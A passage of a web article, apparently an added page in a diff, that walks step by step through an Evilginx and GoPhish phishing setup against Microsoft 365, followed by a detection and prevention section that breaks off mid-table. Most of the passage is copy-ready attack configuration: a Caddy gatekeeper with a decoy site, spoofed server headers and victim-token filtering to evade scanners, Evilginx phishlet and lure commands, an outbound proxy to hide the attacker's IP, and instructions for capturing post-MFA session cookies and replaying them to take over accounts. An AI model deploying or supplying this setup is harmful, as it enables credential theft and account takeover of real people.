+                    <code>        &lt;div class="logo"&gt;APEX CORP&lt;/div&gt;</code>
+                    <code>        &lt;h1&gt;Digital Transformation in Progress&lt;/h1&gt;</code>
+                    <code>        &lt;p&gt;We are modernizing our infrastructure to better serve our enterprise customers.&lt;/p&gt;</code>
+                    <code>        &lt;a class="btn" href="#"&gt;Learn More&lt;/a&gt;</code>
+                    <code>        &lt;div class="footer"&gt;&amp;copy; 2026 Apex Corp. All rights reserved.&lt;/div&gt;</code>
+                    <code>    &lt;/div&gt;</code>
+                    <code>&lt;/body&gt;</code>
+                    <code>&lt;/html&gt;</code>
+                </div>
+            </div>
+
+            <p>Fake nginx 404 page for error responses (<code>/var/www/decoy/404-nginx.html</code>):</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> HTML</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>&lt;html&gt;</code>
+                    <code>&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</code>
+                    <code>&lt;body&gt;</code>
+                    <code>&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;</code>
+                    <code>&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;</code>
+                    <code>&lt;/body&gt;</code>
+                    <code>&lt;/html&gt;</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.12 &mdash; Configure Caddy as the Gatekeeper</h3>
+
+            <p>This is the most important part. Caddy controls all traffic in front of Evilginx:</p>
+
+            <ul>
+                <li>No valid token &rarr; decoy site</li>
+                <li>Valid <code>?utm_source=TOKEN</code> &rarr; strip the token &rarr; forward to Evilginx</li>
+                <li>Returning visitor with session cookie &rarr; forward to Evilginx</li>
+                <li>CDN subdomains (phishlet resources) &rarr; forward to Evilginx</li>
+                <li>Any Evilginx error &rarr; decoy site</li>
+            </ul>
+
+            <p>The tokens are embedded in the GoPhish campaign URL as <code>?utm_source=tonystark</code>. Each token maps to a specific target for tracking who clicked.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/caddy/Caddyfile</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/caddy/Caddyfile</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>*.apex-corp.xyz, login.apex-corp.xyz {</code>
+                    <code></code>
+                    <code>    tls /etc/letsencrypt/live/apex-corp.xyz/fullchain.pem /etc/letsencrypt/live/apex-corp.xyz/privkey.pem</code>
+                    <code></code>
+                    <code>    # Spoof as nginx, strip all revealing proxy headers</code>
+                    <code>    header {</code>
+                    <code>        Server "nginx/1.18.0 (Ubuntu)"</code>
+                    <code>        X-Frame-Options "SAMEORIGIN"</code>
+                    <code>        X-Content-Type-Options "nosniff"</code>
+                    <code>        X-XSS-Protection "1; mode=block"</code>
+                    <code>        Referrer-Policy "strict-origin-when-cross-origin"</code>
+                    <code>        Connection "keep-alive"</code>
+                    <code>        Accept-Ranges "bytes"</code>
+                    <code>        -X-Forwarded-For</code>
+                    <code>        -X-Forwarded-Proto</code>
+                    <code>        -X-Real-IP</code>
+                    <code>        -X-Client-IP</code>
+                    <code>        -Via</code>
+                    <code>        -X-Caddy</code>
+                    <code>        -ETag</code>
+                    <code>        defer</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    # Default: decoy site for all unauthorized traffic</code>
+                    <code>    handle {</code>
+                    <code>        root * /var/www/decoy</code>
+                    <code>        file_server</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    # MATCHER 1: Valid utm_source token + /access path &rarr; Evilginx</code>
+                    <code>    @lure_valid_qs {</code>
+                    <code>        path /access*</code>
+                    <code>        expression {query.utm_source}.matches('^(tonystark|ironman|thor23|capamerica|hulk01|blackwidow|hawkeye|spiderman|drstrange|panther77|mavel2026|vision9|scarlet24|fury01|groot99|rocket42)$')</code>
+                    <code>    }</code>
+                    <code>    handle @lure_valid_qs {</code>
+                    <code>        # Strip query string before forwarding &mdash; Evilginx rejects unknown parameters</code>
+                    <code>        rewrite * {path}?</code>
+                    <code>        reverse_proxy https://localhost:8443 {</code>
+                    <code>            transport http {</code>
+                    <code>                tls</code>
+                    <code>                tls_insecure_skip_verify</code>
+                    <code>                tls_server_name {host}</code>
+                    <code>            }</code>
+                    <code>            header_up Host {host}</code>
+                    <code>            header_up -X-Forwarded-For</code>
+                    <code>            header_up -X-Forwarded-Proto</code>
+                    <code>            header_up -Via</code>
+                    <code>        }</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    # MATCHER 2: /access path WITHOUT valid token &rarr; decoy</code>
+                    <code>    @lure_invalid {</code>
+                    <code>        path /access*</code>
+                    <code>    }</code>
+                    <code>    handle @lure_invalid {</code>
+                    <code>        root * /var/www/decoy</code>
+                    <code>        file_server</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    # MATCHER 3: Returning visitor with Evilginx session cookie &rarr; proxy</code>
+                    <code>    # UPDATE this cookie name after every Evilginx restart</code>
+                    <code>    @has_cookie {</code>
+                    <code>        header Cookie *CHANGE_ME_AFTER_RESTART=*</code>
+                    <code>    }</code>
+                    <code>    handle @has_cookie {</code>
+                    <code>        reverse_proxy https://localhost:8443 {</code>
+                    <code>            transport http {</code>
+                    <code>                tls</code>
+                    <code>                tls_insecure_skip_verify</code>
+                    <code>                tls_server_name {host}</code>
+                    <code>            }</code>
+                    <code>            header_up Host {host}</code>
+                    <code>            header_up -X-Forwarded-For</code>
+                    <code>            header_up -X-Forwarded-Proto</code>
+                    <code>            header_up -Via</code>
+                    <code>        }</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    # MATCHER 4: CDN subdomains (phishlet loads resources from these)</code>
+                    <code>    @cdn_content {</code>
+                    <code>        host auth-prod.apex-corp.xyz portal-prod.apex-corp.xyz uniquecdn.apex-corp.xyz sso-prod.apex-corp.xyz</code>
+                    <code>    }</code>
+                    <code>    handle @cdn_content {</code>
+                    <code>        reverse_proxy https://localhost:8443 {</code>
+                    <code>            transport http {</code>
+                    <code>                tls</code>
+                    <code>                tls_insecure_skip_verify</code>
+                    <code>                tls_server_name {host}</code>
+                    <code>            }</code>
+                    <code>            header_up Host {host}</code>
+                    <code>            header_up -X-Forwarded-For</code>
+                    <code>            header_up -X-Forwarded-Proto</code>
+                    <code>            header_up -Via</code>
+                    <code>        }</code>
+                    <code>    }</code>
+                    <code></code>
+                    <code>    # Catch all errors &rarr; serve decoy site</code>
+                    <code>    handle_errors {</code>
+                    <code>        header Server "nginx/1.18.0 (Ubuntu)"</code>
+                    <code>        root * /var/www/decoy</code>
+                    <code>        file_server</code>
+                    <code>    }</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p><strong>What each request gets:</strong></p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Request</th>
+                        <th>Result</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Any bot or scanner</td>
+                        <td>Decoy site</td>
+                    </tr>
+                    <tr>
+                        <td><code>/wp-admin</code>, <code>/.env</code>, random scanner paths</td>
+                        <td>Decoy site</td>
+                    </tr>
+                    <tr>
+                        <td><code>login.apex-corp.xyz/</code></td>
+                        <td>Decoy site</td>
+                    </tr>
+                    <tr>
+                        <td><code>login.apex-corp.xyz/access</code> (no token)</td>
+                        <td>Decoy site</td>
+                    </tr>
+                    <tr>
+                        <td><code>login.apex-corp.xyz/access?utm_source=scarlet24</code></td>
+                        <td>Valid &mdash; forward to Evilginx</td>
+                    </tr>
+                    <tr>
+                        <td>Any request with session cookie</td>
+                        <td>Forward to Evilginx</td>
+                    </tr>
+                    <tr>
+                        <td><code>auth-prod.apex-corp.xyz</code>, <code>sso-prod.apex-corp.xyz</code></td>
+                        <td>Forward to Evilginx</td>
+                    </tr>
+                    <tr>
+                        <td>Any 502/500 error from Evilginx</td>
+                        <td>Decoy site</td>
+                    </tr>
+                </tbody>
+            </table>
+
+                        <hr>
+
+            <h3>Step 2.13 &mdash; Configure Evilginx</h3>
+
+            <p>Edit <code>~/.evilginx/config.json</code> (auto-generated on first run, then edit it):</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/EvilginxConfigjosn.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/EvilginxConfigjosn.png" alt="Evilginx Config JSON">
+                </a>
+                <figcaption>Figure 52: Evilginx configuration JSON file.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> ~/.evilginx/config.json</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>{</code>
+                    <code>  "blacklist": {</code>
+                    <code>    "mode": "off"</code>
+                    <code>  },</code>
+                    <code>  "general": {</code>
+                    <code>    "autocert": false,</code>
+                    <code>    "bind_ipv4": "",</code>
+                    <code>    "dns_port": 53,</code>
+                    <code>    "domain": "apex-corp.xyz",</code>
+                    <code>    "external_ipv4": "YOUR_VPS2_IP",</code>
+                    <code>    "https_port": 8443,</code>
+                    <code>    "ipv4": "YOUR_VPS2_IP",</code>
+                    <code>    "unauth_url": ""</code>
+                    <code>  },</code>
+                    <code>  "server": {</code>
+                    <code>    "bind_ipv4": "",</code>
+                    <code>    "dns_port": 53,</code>
+                    <code>    "domain": "apex-corp.xyz",</code>
+                    <code>    "external_ipv4": "YOUR_VPS2_IP",</code>
+                    <code>    "http_port": 8080,</code>
+                    <code>    "https_port": 8443</code>
+                    <code>  }</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <blockquote>
+                <p>Set <code>blacklist.mode</code> to <code>off</code> because Caddy handles all filtering. If you leave Evilginx blacklist on, it may block Caddy's own internal requests to localhost:8443.</p>
+            </blockquote>
+
+            <hr>
+
+            <h3>Step 2.14 &mdash; Create the Evilginx Systemd Service</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/systemd/system/evilginx.service</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/systemd/system/evilginx.service</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>[Unit]</code>
+                    <code>Description=Evilginx3 Phishing Proxy</code>
+                    <code>After=network.target caddy.service</code>
+                    <code></code>
+                    <code>[Service]</code>
+                    <code>Type=simple</code>
+                    <code>User=root</code>
+                    <code>WorkingDirectory=/root/evilginx2</code>
+                    <code>ExecStart=/root/evilginx2/evilginx -p /root/evilginx2/phishlets -t /root/evilginx2/redirectors -developer -debug</code>
+                    <code>Restart=on-failure</code>
+                    <code>RestartSec=5</code>
+                    <code></code>
+                    <code>[Install]</code>
+                    <code>WantedBy=multi-user.target</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl daemon-reload</code>
+                    <code><span class="prompt">$</span> systemctl enable evilginx</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.15 &mdash; UFW + Fail2Ban on VPS 2</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> ufw default deny incoming</code>
+                    <code><span class="prompt">$</span> ufw default allow outgoing</code>
+                    <code><span class="prompt">$</span> ufw allow 22/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 80/tcp</code>
+                    <code><span class="prompt">$</span> ufw allow 443/tcp</code>
+                    <code><span class="prompt">$</span> ufw enable</code>
+                </div>
+            </div>
+
+            <blockquote>
+                <p>Port 8443 is NOT opened publicly. Evilginx only listens on <code>localhost:8443</code>. Only Caddy can reach it internally.</p>
+            </blockquote>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/UFWfirewall.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/UFWfirewall.png" alt="UFW Firewall VPS 2">
+                </a>
+                <figcaption>Figure 53: UFW firewall rules on VPS 2.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install fail2ban -y</code>
+                    <code><span class="prompt">$</span> nano /etc/fail2ban/jail.local</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/fail2ban/jail.local</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>[DEFAULT]</code>
+                    <code>bantime = 3600</code>
+                    <code>findtime = 600</code>
+                    <code>maxretry = 5</code>
+                    <code>banaction = ufw</code>
+                    <code></code>
+                    <code>[sshd]</code>
+                    <code>enabled = true</code>
+                    <code>port = ssh</code>
+                    <code>logpath = /var/log/auth.log</code>
+                    <code>maxretry = 3</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl restart fail2ban</code>
+                    <code><span class="prompt">$</span> systemctl enable fail2ban</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.16 &mdash; Start Everything</h3>
+
+            <p><strong>Start Evilginx first:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl start evilginx</code>
+                </div>
+            </div>
+
+            <p>The first run creates config files automatically:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/EvilginxFirstRun.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/EvilginxFirstRun.png" alt="Evilginx First Run">
+                </a>
+                <figcaption>Figure 54: Evilginx first run creating config files automatically.</figcaption>
+            </figure>
+
+            <p><strong>Configure Evilginx inside its CLI:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Evilginx CLI</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> config autocert off</code>
+                    <code><span class="prompt">$</span> config domain apex-corp.xyz</code>
+                    <code><span class="prompt">$</span> config ipv4 YOUR_VPS2_IP</code>
+                    <code><span class="prompt">$</span> blacklist off</code>
+                    <code><span class="prompt">$</span> phishlets hostname o365 login.apex-corp.xyz</code>
+                    <code><span class="prompt">$</span> phishlets enable o365</code>
+                    <code><span class="prompt">$</span> lures create o365</code>
+                    <code><span class="prompt">$</span> lures edit 0 redirect_url https://portal.office.com</code>
+                    <code><span class="prompt">$</span> lures edit 0 path /access</code>
+                    <code><span class="prompt">$</span> lures get-url 0</code>
+                </div>
+            </div>
+
+            <blockquote>
+                <p><strong>Optional &mdash; hide your VPS IP from Microsoft:</strong> When Evilginx proxies the Microsoft login page, Microsoft logs the connecting IP. To hide it, configure an outbound proxy:</p>
+            </blockquote>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Evilginx CLI</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> proxy type http</code>
+                    <code><span class="prompt">$</span> proxy address YOUR_PROXY_HOST</code>
+                    <code><span class="prompt">$</span> proxy port 8080</code>
+                    <code><span class="prompt">$</span> proxy username YOUR_PROXY_USER</code>
+                    <code><span class="prompt">$</span> proxy password YOUR_PROXY_PASS</code>
+                    <code><span class="prompt">$</span> proxy enable</code>
+                </div>
+            </div>
+
+            <p>Run <code>proxy</code> to verify it shows Status: enabled.</p>
+
+            <p><strong>Start Caddy:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl start caddy</code>
+                    <code><span class="prompt">$</span> systemctl enable caddy</code>
+                </div>
+            </div>
+
+            <p>If Caddy complains about certificate permissions:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> chown caddy:caddy /etc/letsencrypt/live/apex-corp.xyz/fullchain.pem</code>
+                    <code><span class="prompt">$</span> chown caddy:caddy /etc/letsencrypt/live/apex-corp.xyz/privkey.pem</code>
+                    <code><span class="prompt">$</span> systemctl restart caddy</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CaddyWorkingPerfectly.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CaddyWorkingPerfectly.png" alt="Caddy Working">
+                </a>
+                <figcaption>Figure 55: Caddy working perfectly on VPS 2.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 2.17 &mdash; Get the Cookie Name and Update Caddyfile</h3>
+
+            <p>Every time Evilginx starts, it generates a new session cookie name. You need to update the Caddyfile with this name so returning visitors (with a valid cookie) get forwarded correctly.</p>
+
+            <p>Run this with a valid token:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> curl -sI -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \</code>
+                    <code>  "https://login.apex-corp.xyz/access?utm_source=tonystark"</code>
+                </div>
+            </div>
+
+            <p>Look at the <code>Set-Cookie</code> header in the response. Copy the cookie name (e.g. <code>2a8f9b</code>).</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/FindingtheCookie.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/FindingtheCookie.png" alt="Finding Cookie Name">
+                </a>
+                <figcaption>Figure 56: Finding the Evilginx session cookie name from the response.</figcaption>
+            </figure>
+
+            <p>Update the <code>@has_cookie</code> matcher in <code>/etc/caddy/Caddyfile</code>:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/caddy/Caddyfile</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>@has_cookie {</code>
+                    <code>    header Cookie *2a8f9b=*</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p>Reload Caddy to apply the change:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl reload caddy</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/SpecifyingThatCookieInsideCaddy.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/SpecifyingThatCookieInsideCaddy.png" alt="Cookie in Caddyfile">
+                </a>
+                <figcaption>Figure 57: Specifying the cookie name inside the Caddyfile.</figcaption>
+            </figure>
+
+            <blockquote>
+                <p><strong>Remember:</strong> You must do this every time Evilginx restarts, because the cookie name is re-generated each time.</p>
+            </blockquote>
+
+            <hr>
+
+            <h2 id="part3">5. Part 3 &mdash; Running the Attack</h2>
+
+            <h3>Step 3.1 &mdash; Create the Lure URL</h3>
+
+            <p>Inside the Evilginx CLI:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Evilginx CLI</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> lures create o365</code>
+                    <code><span class="prompt">$</span> lures edit 0 path /access</code>
+                    <code><span class="prompt">$</span> lures get-url 0</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CreatingLuresLink.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CreatingLuresLink.png" alt="Creating Lure URL">
+                </a>
+                <figcaption>Figure 58: Creating the lure URL in Evilginx CLI.</figcaption>
+            </figure>
+
+            <p>Copy this URL. This is what goes into the GoPhish campaign as <code>{{.URL}}</code>.</p>
+
+            <hr>
+
+            <h3>Step 3.2 &mdash; Test the Token Gate</h3>
+
+            <p>Accessing the lure URL without a valid token returns the decoy site:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/404Error.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/404Error.png" alt="404 Error">
+                </a>
+                <figcaption>Figure 59: Accessing the lure URL without a valid token shows the decoy site.</figcaption>
+            </figure>
+
+            <p>This is correct behaviour &mdash; Caddy is blocking anyone who does not have a valid <code>utm_source</code>.</p>
+
+            <p>The valid tokens we configured:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Tokens</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>tonystark | ironman | thor23 | capamerica | hulk01 | blackwidow | hawkeye</code>
+                    <code>spiderman | drstrange | panther77 | mavel2026 | vision9 | scarlet24 | fury01</code>
+                    <code>groot99 | rocket42</code>
+                </div>
+            </div>
+
+            <p>Testing with <code>scarlet24</code> as the token &mdash; the difference is clear:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/usginCurlToAccessEvilGinxlurespage.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/usginCurlToAccessEvilGinxlurespage.png" alt="Curl Test with Token">
+                </a>
+                <figcaption>Figure 60: Testing the lure with a valid token using curl.</figcaption>
+            </figure>
+
+            <p>With the correct token, the real Microsoft login page loads through Evilginx:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/WebsiteWorkedWithTheCorrectToken.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/WebsiteWorkedWithTheCorrectToken.png" alt="Microsoft Login via Evilginx">
+                </a>
+                <figcaption>Figure 61: Real Microsoft login page loaded through Evilginx with valid token.</figcaption>
+            </figure>
+
+                        <hr>
+
+            <h3>Step 3.3 &mdash; Enter Credentials</h3>
+
+            <p>The victim enters their real Microsoft credentials on what looks like the legitimate login page:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/EntertingThepassword.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/EntertingThepassword.png" alt="Entering Credentials">
+                </a>
+                <figcaption>Figure 62: Victim entering real Microsoft credentials on the proxied login page.</figcaption>
+            </figure>
+
+            <p>After login, they are forwarded to the real Microsoft portal. They notice nothing wrong:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/LoggedintoRealMicrosoftWebsite.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/LoggedintoRealMicrosoftWebsite.png" alt="Redirected to Real Microsoft">
+                </a>
+                <figcaption>Figure 63: Victim redirected to the real Microsoft portal after login.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 3.4 &mdash; Check the Captured Session</h3>
+
+            <p>Back in the Evilginx console:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/SuccessfullygotTheCapture.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/SuccessfullygotTheCapture.png" alt="Captured Session">
+                </a>
+                <figcaption>Figure 64: Evilginx successfully captured the session credentials.</figcaption>
+            </figure>
+
+            <p>The full session &mdash; username, password, and all session cookies:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/SessionInDetails.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/SessionInDetails.png" alt="Session Details">
+                </a>
+                <figcaption>Figure 65: Session details showing captured username, password, and cookies.</figcaption>
+            </figure>
+
+            <p>Even though the account had MFA enabled, the session cookie was captured <strong>after</strong> MFA completed. The cookie is already fully authenticated. Evilginx does not bypass MFA &mdash; it just waits for the user to complete it and grabs the resulting cookie on the way back.</p>
+
+            <hr>
+
+            <h3>Step 3.5 &mdash; Session Replay (Account Takeover)</h3>
+
+            <p>Use the <strong>StorageAce</strong> browser extension (or EditThisCookie) to import the captured session cookies into a fresh browser profile:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/importingTheSessionCookie.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/importingTheSessionCookie.png" alt="Importing Session Cookie">
+                </a>
+                <figcaption>Figure 66: Importing the captured session cookie into the browser.</figcaption>
+            </figure>
+
+            <p>After importing the cookies and refreshing, the browser asks which account to use &mdash; because it already sees an authenticated session:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/AskingMeTopickAnAccount.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/AskingMeTopickAnAccount.png" alt="Account Picker">
+                </a>
+                <figcaption>Figure 67: Browser showing account picker after importing authenticated session cookies.</figcaption>
+            </figure>
+
+            <p>Enter the password (which Evilginx already captured) and the login completes. You are now logged in as the victim &mdash; with full access to their Outlook, OneDrive, Teams, SharePoint, and everything else in Microsoft 365.</p>
+
+            <p><strong>MFA was bypassed</strong> &mdash; not because MFA was broken, but because the session token was captured <em>after</em> MFA completed successfully. The token proves authentication already happened.</p>
+
+            <hr>
+
+            <h2 id="blueteam">6. Blue Team &mdash; How to Detect and Prevent This</h2>
+
+            <blockquote>
+                <p>This is the most important part. Understanding detection and prevention is what demonstrates you understand the attack beyond just running the tools.</p>
+            </blockquote>
+
+            <h3>Detection</h3>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Stage</th>
+                        <th>What Happened</th>
+                        <th>How to Detect</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Phishing email sent</td>
+                        <td>Email from <code>security@apex-corp.xyz</code> arrived</td>
+                        <td>DMARC aggregate reports; check sending IP against SPF allowlist</td>
+                    </tr>
+                    <tr>
+                        <td>User clicked the link</td>
+                        <td>Browser went to <code>login.apex-corp.xyz</code></td>
+                        <td>Defender Safe Links or proxy logs flagging the suspicious domain</td>
+                    </tr>
+                    <tr>
+                        <td>Evilginx proxied the login</td>
+                        <td>Real Microsoft page served via attacker's VPS</td>
+                        <td>Entra ID sign-in logs showing unfamiliar IP and location</td>
+                    </tr>
+                    <tr>
+                        <td>Credentials entered</td>
+                        <td>Evilginx captured username + password</td>
+                        <td>Credential detection tools &mdash; but too late at this stage</td>
+                    </tr>
+                    <tr>
+                        <td>MFA completed</td>
+                        <td>Evilginx captured post-MFA session cookie</td>
+                        <td>MFA challenge coming from an unexpected IP geolocation</td>
+                    </tr>
+                    <tr>
+                        <td>Session replayed</td>
+                        <td>Attacker logged in from a different country</td>
+                        <td>Impossible travel alert in Entra ID</td>
+                    </tr>
+                    <tr>
+                        <td>Account accessed</td>
+                        <td>Attacker read emails, downloaded files</td>
+                        <td>Anomalous mail rules, bulk download alerts, Unified Audit Log</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Prevention</h3>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Control</th>
+                        <th>Why It Works</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>FIDO2 / Passkeys (phishing-resistant MFA)</strong></td>
+                        <td>FIDO2 keys are cryptographically bound to the real origin domain. A login attempt at <code>login.apex-corp.xyz</code> fails because the key only works on <code>login.microsoftonline.com</code>. This is the <strong>only control that stops AiTM at the protocol level.</strong></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Microsoft Defender Safe Links</strong></td>
+                        <td>Rewrites and scans URLs at click time. Can flag newly registered or suspicious domains before the user reaches them.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Conditional Access &mdash; require compliant device</strong></td>
+                        <td>Evilginx creates a session from the attacker's machine, which will not be enrolled in your MDM or pass device compliance checks.</td>
+                    </tr>
+                    <tr>
